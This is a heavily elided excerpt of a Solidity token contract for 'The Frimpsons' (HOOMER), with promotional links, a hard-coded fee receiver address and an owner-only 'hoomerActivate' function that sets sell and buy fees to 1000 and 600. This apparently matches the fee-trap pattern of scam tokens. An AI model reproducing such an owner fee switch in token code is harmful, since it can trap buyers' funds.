...
/* 
https://t.me/HOOMER_ERC
https://twitter.com/HOOMERTOKEN
https://hoomer.vip/
...
contract TheFrimpsons is Ownable, ERC20 {
    ...
    string constant _name = "The Frimpsons";
    string constant _symbol = "HOOMER";
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x28a5e43076fAe6100edE173d8f5604042b78A0A3;
   ...
   function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {
    ...
    function hoomerActivate() public onlyOwner {
        sellpercent = 1000;
        buypercent = 600;
        transferpercent = 0; 
